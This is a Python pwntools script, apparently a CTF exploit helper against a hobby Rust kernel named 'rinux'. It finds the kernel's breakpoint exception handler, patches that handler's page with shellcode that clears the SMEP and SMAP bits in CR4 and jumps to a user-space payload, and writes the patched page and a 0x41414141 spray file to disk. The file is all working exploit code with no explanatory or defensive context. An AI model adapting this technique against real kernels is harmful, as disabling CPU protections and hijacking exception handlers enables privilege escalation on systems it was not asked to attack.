#!/usr/bin/env python3

from pwn import ELF, log, context, asm, p64
from itertools import tee
from pathlib import Path

curdir = Path(__file__).parent
kernel = context.binary = ELF(str(curdir / "tmp/rinux/src/target/x86_64-unknown-none/release/kernel"))


def same_page(addr1, addr2):
    return (addr1 & ~0xfff) == (addr2 & ~0xfff)


def get_original_content():
    for sym in kernel.sym:
        if "_ZN6kernel3idt18breakpoint_handler" in sym:
            handler_address = kernel.sym[sym]
            break
    else:
        log.error("Symbol not found")

    log.info(f"Address of exception handler: {handler_address:#x}")

    symbols = []

    for sym in kernel.sym:
        addr = kernel.sym[sym]
        diff = addr - handler_address
        if abs(diff) < 0x2000:
            symbols.append((diff, addr, sym))

    symbols.sort()
    near_symbols = []
    for sym, nextsym in pairwise(symbols):
        if same_page(sym[1], handler_address):
            near_symbols.append(sym)
            continue
        if not same_page(sym[1], nextsym[1]):
            near_symbols.append(sym)
            near_symbols.append(nextsym)
            continue

    for sym in near_symbols:
        log.info(f"Sym: ({sym[0]} {sym[1]:#018x}, {sym[2]})")

    content = kernel.read(handler_address & ~0xfff, 0x1000)

    return content, handler_address


def pairwise(iterable):
    "s -> (s0, s1), (s1, s2), (s2, s3), ..."
    a, b = tee(iterable)
    next(b, None)
    return zip(a, b)


def main():

    kernel.address = 0xffffffff81000000
    content, addr = get_original_content()

    bitmask = ((1 << 64) - 1) - ((1 << 20) | (1 << 21))
    other_exe = ELF("root/c")
    usr_addr = other_exe.sym['kernel_shellcode']
    # usr_addr = 0xdeadbeef
    shellcode = asm(
        f"""
        push rax
        mov rax, cr4
        and rax, {bitmask:#x}
        mov cr4, rax

        mov rax, {usr_addr:#x}
        jmp rax
        """
    )

    off = addr & 0xfff
    newcontent = content[:off] + shellcode + content[off + len(shellcode):]
    if len(newcontent) != 0x1000:
        log.error(f"Somma fatta male, {len(newcontent)}")
    with open("tmp/kernel_shellcode.bin", "wb") as outfile:
        outfile.write(newcontent)

    data = p64(0x41414141)
    content = data * 512 * 31
    with open("tmp/kernel_data.bin", "wb") as outfile:
        outfile.write(content)


if __name__ == '__main__':
    main()
